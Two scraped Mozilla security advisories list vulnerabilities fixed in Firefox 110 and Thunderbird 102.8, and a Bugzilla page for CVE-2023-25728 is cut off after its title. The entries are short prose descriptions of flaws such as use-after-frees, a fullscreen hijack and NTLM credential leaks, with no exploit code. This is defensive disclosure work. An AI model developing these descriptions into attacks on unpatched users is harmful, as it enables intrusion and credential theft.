=== Content from www.mozilla.org_ce722dd0_20250115_091631.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-05

## Security Vulnerabilities fixed in Firefox 110

Announced
February 14, 2023
Impact
high
Products
Firefox
Fixed in

* Firefox 110

#### [#CVE-2023-25728: Content security policy leak in violation reports using iframes](#CVE-2023-25728)

Reporter
Johan Carlsson
Impact
high
##### Description

The `Content-Security-Policy-Report-Only` header could allow an attacker to leak a child iframe's unredacted URI when interaction with that iframe triggers a redirect.

##### References

* [Bug 1790345](https://bugzilla.mozilla.org/show_bug.cgi?id=1790345)

#### [#CVE-2023-25730: Screen hijack via browser fullscreen mode](#CVE-2023-25730)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A background script invoking `requestFullscreen` and then blocking the main thread could force the browser into fullscreen mode indefinitely, resulting in potential user confusion or spoofing attacks.

##### References

* [Bug 1794622](https://bugzilla.mozilla.org/show_bug.cgi?id=1794622)

#### [#CVE-2023-25743: Fullscreen notification not shown in Firefox Focus](#CVE-2023-25743)

Reporter
Hafiizh
Impact
high
##### Description

A lack of in app notification for entering fullscreen mode could have lead to a malicious website spoofing browser chrome.
*This bug only affects Firefox Focus. Other versions of Firefox are unaffected.*

##### References

* [Bug 1800203](https://bugzilla.mozilla.org/show_bug.cgi?id=1800203)

#### [#CVE-2023-0767: Arbitrary memory write via PKCS 12 in NSS](#CVE-2023-0767)

Reporter
Christian Holler
Impact
high
##### Description

An attacker could construct a PKCS 12 cert bundle in such a way that could allow for arbitrary memory writes via PKCS 12 Safe Bag attributes being mishandled.

##### References

* [Bug 1804640](https://bugzilla.mozilla.org/show_bug.cgi?id=1804640)

#### [#CVE-2023-25735: Potential use-after-free from compartment mismatch in SpiderMonkey](#CVE-2023-25735)

Reporter
Samuel Groß
Impact
high
##### Description

Cross-compartment wrappers wrapping a scripted proxy could have caused objects from other compartments to be stored in the main compartment resulting in a use-after-free after unwrapping the proxy.

##### References

* [Bug 1810711](https://bugzilla.mozilla.org/show_bug.cgi?id=1810711)

#### [#CVE-2023-25737: Invalid downcast in SVGUtils::SetupStrokeGeometry](#CVE-2023-25737)

Reporter
Lukas Bernhard
Impact
high
##### Description

An invalid downcast from `nsTextNode` to `SVGElement` could have lead to undefined behavior.

##### References

* [Bug 1811464](https://bugzilla.mozilla.org/show_bug.cgi?id=1811464)

#### [#CVE-2023-25738: Printing on Windows could potentially crash Firefox with some device drivers](#CVE-2023-25738)

Reporter
Mark
Impact
high
##### Description

Members of the `DEVMODEW` struct set by the printer device driver weren't being validated and could have resulted in invalid values which in turn would cause the browser to attempt out of bounds access to related variables.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1811852](https://bugzilla.mozilla.org/show_bug.cgi?id=1811852)

#### [#CVE-2023-25739: Use-after-free in mozilla::dom::ScriptLoadContext::~ScriptLoadContext](#CVE-2023-25739)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

Module load requests that failed were not being checked as to whether or not they were cancelled causing a use-after-free in `ScriptLoadContext`.

##### References

* [Bug 1811939](https://bugzilla.mozilla.org/show_bug.cgi?id=1811939)

#### [#CVE-2023-25729: Extensions could have opened external schemes without user knowledge](#CVE-2023-25729)

Reporter
Vitor Torres
Impact
moderate
##### Description

Permission prompts for opening external schemes were only shown for `ContentPrincipals` resulting in extensions being able to open them without user interaction via `ExpandedPrincipals`. This could lead to further malicious actions such as downloading files or interacting with software already installed on the system.

##### References

* [Bug 1792138](https://bugzilla.mozilla.org/show_bug.cgi?id=1792138)

#### [#CVE-2023-25732: Out of bounds memory write from EncodeInputStream](#CVE-2023-25732)

Reporter
Ronald Crane
Impact
moderate
##### Description

When encoding data from an `inputStream` in `xpcom` the size of the input being encoded was not correctly calculated potentially leading to an out of bounds memory write.

##### References

* [Bug 1804564](https://bugzilla.mozilla.org/show_bug.cgi?id=1804564)

#### [#CVE-2023-25734: Opening local .url files could cause unexpected network loads](#CVE-2023-25734)

Reporter
Ameen Basha M K and Shaheen Fazim
Impact
moderate
##### Description

After downloading a Windows `.url` shortcut from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1809923](https://bugzilla.mozilla.org/show_bug.cgi?id=1809923)
* [Bug 1784451](https://bugzilla.mozilla.org/show_bug.cgi?id=1784451)
* [Bug 1810143](https://bugzilla.mozilla.org/show_bug.cgi?id=1810143)
* [Bug 1812338](https://bugzilla.mozilla.org/show_bug.cgi?id=1812338)

#### [#CVE-2023-25740: Opening local .scf files could cause unexpected network loads](#CVE-2023-25740)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

After downloading a Windows `.scf` script from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Firefox for Windows. Other operating systems are unaffected.*

##### References

* [Bug 1812354](https://bugzilla.mozilla.org/show_bug.cgi?id=1812354)

#### [#CVE-2023-25731: Prototype pollution when rendering URLPreview](#CVE-2023-25731)

Reporter
pyakovlev & Alexander Volkov
Impact
low
##### Description

Due to URL previews in the network panel of developer tools improperly storing URLs, query parameters could potentially be used to overwrite global objects in privileged code.

##### References

* [Bug 1801542](https://bugzilla.mozilla.org/show_bug.cgi?id=1801542)

#### [#CVE-2023-25733: Possible null pointer dereference in TaskbarPreviewCallback](#CVE-2023-25733)

Reporter
Ronald Crane
Impact
low
##### Description

The return value from `gfx::SourceSurfaceSkia::Map()` wasn't being verified which could have potentially lead to a null pointer dereference.

##### References

* [Bug 1808632](https://bugzilla.mozilla.org/show_bug.cgi?id=1808632)

#### [#CVE-2023-25736: Invalid downcast in GetTableSelectionMode](#CVE-2023-25736)

Reporter
Lukas Bernhard
Impact
low
##### Description

An invalid downcast from `nsHTMLDocument` to `nsIContent` could have lead to undefined behavior.

##### References

* [Bug 1811331](https://bugzilla.mozilla.org/show_bug.cgi?id=1811331)

#### [#CVE-2023-25741: Same-origin policy leak via image drag and drop](#CVE-2023-25741)

Reporter
Dohyun Lee (@l33d0hyun) of SSD Labs
Impact
low
##### Description

When dragging and dropping an image cross-origin, the image's size could potentially be leaked. This behavior was shipped in 109 and caused web compatibility problems as well as this security concern, so the behavior was disabled until further review.

##### References

* [Bug 1813376](https://bugzilla.mozilla.org/show_bug.cgi?id=1813376)
* [Bug 1437126](https://bugzilla.mozilla.org/show_bug.cgi?id=1437126)
* [Bug 1812611](https://bugzilla.mozilla.org/show_bug.cgi?id=1812611)

#### [#CVE-2023-25742: Web Crypto ImportKey crashes tab](#CVE-2023-25742)

Reporter
Goras Francesco
Impact
low
##### Description

When importing a SPKI RSA public key as ECDSA P-256, the key would be handled incorrectly causing the tab to crash.

##### References

* [Bug 1813424](https://bugzilla.mozilla.org/show_bug.cgi?id=1813424)

#### [#CVE-2023-25744: Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](#CVE-2023-25744)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Kershaw Chang and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 109 and Firefox ESR 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 110 and Firefox ESR 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1789449%2C1803628%2C1810536)

#### [#CVE-2023-25745: Memory safety bugs fixed in Firefox 110](#CVE-2023-25745)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Timothy Nikkel, Gabriele Svelto, Jeff Muizelaar and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 109. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 110](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1688592%2C1797186%2C1804998%2C1806521%2C1813284)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_38b9263f_20250115_091633.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-07

## Security Vulnerabilities fixed in Thunderbird 102.8

Announced
February 15, 2023
Impact
low
Products
Thunderbird
Fixed in

* Thunderbird 102.8

*Except for CVE-2023--0616, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2023-0616: User Interface lockup with messages combining S/MIME and OpenPGP](#CVE-2023-0616)

Reporter
Kai Engert
Impact
low
##### Description

If a MIME email combines OpenPGP and OpenPGP MIME data in a certain way Thunderbird repeatedly attempts to process and display the message, which could cause Thunderbird's user interface to lock up and no longer respond to the user's actions. An attacker could send a crafted message with this structure to attempt a DoS attack.

##### References

* [Bug 1806507](https://bugzilla.mozilla.org/show_bug.cgi?id=1806507)

#### [#CVE-2023-25728: Content security policy leak in violation reports using iframes](#CVE-2023-25728)

Reporter
Johan Carlsson
Impact
high
##### Description

The `Content-Security-Policy-Report-Only` header could allow an attacker to leak a child iframe's unredacted URI when interaction with that iframe triggers a redirect.

##### References

* [Bug 1790345](https://bugzilla.mozilla.org/show_bug.cgi?id=1790345)

#### [#CVE-2023-25730: Screen hijack via browser fullscreen mode](#CVE-2023-25730)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A background script invoking `requestFullscreen` and then blocking the main thread could force the browser into fullscreen mode indefinitely, resulting in potential user confusion or spoofing attacks.

##### References

* [Bug 1794622](https://bugzilla.mozilla.org/show_bug.cgi?id=1794622)

#### [#CVE-2023-0767: Arbitrary memory write via PKCS 12 in NSS](#CVE-2023-0767)

Reporter
Christian Holler
Impact
high
##### Description

An attacker could construct a PKCS 12 cert bundle in such a way that could allow for arbitrary memory writes via PKCS 12 Safe Bag attributes being mishandled.

##### References

* [Bug 1804640](https://bugzilla.mozilla.org/show_bug.cgi?id=1804640)

#### [#CVE-2023-25735: Potential use-after-free from compartment mismatch in SpiderMonkey](#CVE-2023-25735)

Reporter
Samuel Groß
Impact
high
##### Description

Cross-compartment wrappers wrapping a scripted proxy could have caused objects from other compartments to be stored in the main compartment resulting in a use-after-free after unwrapping the proxy.

##### References

* [Bug 1810711](https://bugzilla.mozilla.org/show_bug.cgi?id=1810711)

#### [#CVE-2023-25737: Invalid downcast in SVGUtils::SetupStrokeGeometry](#CVE-2023-25737)

Reporter
Lukas Bernhard
Impact
high
##### Description

An invalid downcast from `nsTextNode` to `SVGElement` could have lead to undefined behavior.

##### References

* [Bug 1811464](https://bugzilla.mozilla.org/show_bug.cgi?id=1811464)

#### [#CVE-2023-25738: Printing on Windows could potentially crash Thunderbird with some device drivers](#CVE-2023-25738)

Reporter
Mark
Impact
high
##### Description

Members of the `DEVMODEW` struct set by the printer device driver weren't being validated and could have resulted in invalid values which in turn would cause the browser to attempt out of bounds access to related variables.
*This bug only affects Thunderbird on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1811852](https://bugzilla.mozilla.org/show_bug.cgi?id=1811852)

#### [#CVE-2023-25739: Use-after-free in mozilla::dom::ScriptLoadContext::~ScriptLoadContext](#CVE-2023-25739)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

Module load requests that failed were not being checked as to whether or not they were cancelled causing a use-after-free in `ScriptLoadContext`.

##### References

* [Bug 1811939](https://bugzilla.mozilla.org/show_bug.cgi?id=1811939)

#### [#CVE-2023-25729: Extensions could have opened external schemes without user knowledge](#CVE-2023-25729)

Reporter
Vitor Torres
Impact
moderate
##### Description

Permission prompts for opening external schemes were only shown for `ContentPrincipals` resulting in extensions being able to open them without user interaction via `ExpandedPrincipals`. This could lead to further malicious actions such as downloading files or interacting with software already installed on the system.

##### References

* [Bug 1792138](https://bugzilla.mozilla.org/show_bug.cgi?id=1792138)

#### [#CVE-2023-25732: Out of bounds memory write from EncodeInputStream](#CVE-2023-25732)

Reporter
Ronald Crane
Impact
moderate
##### Description

When encoding data from an `inputStream` in `xpcom` the size of the input being encoded was not correctly calculated potentially leading to an out of bounds memory write.

##### References

* [Bug 1804564](https://bugzilla.mozilla.org/show_bug.cgi?id=1804564)

#### [#CVE-2023-25734: Opening local .url files could cause unexpected network loads](#CVE-2023-25734)

Reporter
Ameen Basha M K and Shaheen Fazim
Impact
moderate
##### Description

After downloading a Windows `.url` shortcut from the local filesystem, an attacker could supply a remote path that would lead to unexpected network requests from the operating system. This also had the potential to leak NTLM credentials to the resource.
*This bug only affects Thunderbird on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1809923](https://bugzilla.mozilla.org/show_bug.cgi?id=1809923)
* [Bug 1784451](https://bugzilla.mozilla.org/show_bug.cgi?id=1784451)
* [Bug 1810143](https://bugzilla.mozilla.org/show_bug.cgi?id=1810143)
* [Bug 1812338](https://bugzilla.mozilla.org/show_bug.cgi?id=1812338)

#### [#CVE-2023-25742: Web Crypto ImportKey crashes tab](#CVE-2023-25742)

Reporter
Goras Francesco
Impact
low
##### Description

When importing a SPKI RSA public key as ECDSA P-256, the key would be handled incorrectly causing the tab to crash.

##### References

* [Bug 1813424](https://bugzilla.mozilla.org/show_bug.cgi?id=1813424)

#### [#CVE-2023-25746: Memory safety bugs fixed in Thunderbird 102.8](#CVE-2023-25746)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Philipp and Gabriele Svelto reported memory safety bugs present in Thunderbird 102.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Thunderbird 102.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1544127%2C1762368%2C1789449%2C1803628%2C1810536)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_49872cf8_20250115_091630.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1790345)
* [XML](/show_bug.cgi?ctype=xml&id=1790345)

Closed
[Bug 1790345](/show_bug.cgi?id=1790345)
(CVE-2023-25728)

Opened 2 years ago
Closed 2 years ago

# CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

CSP violation report can be made to leak cross origin information from embedded page (bypassing SOP)

## Categories

### (Core :: DOM: Security, defect, P2)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
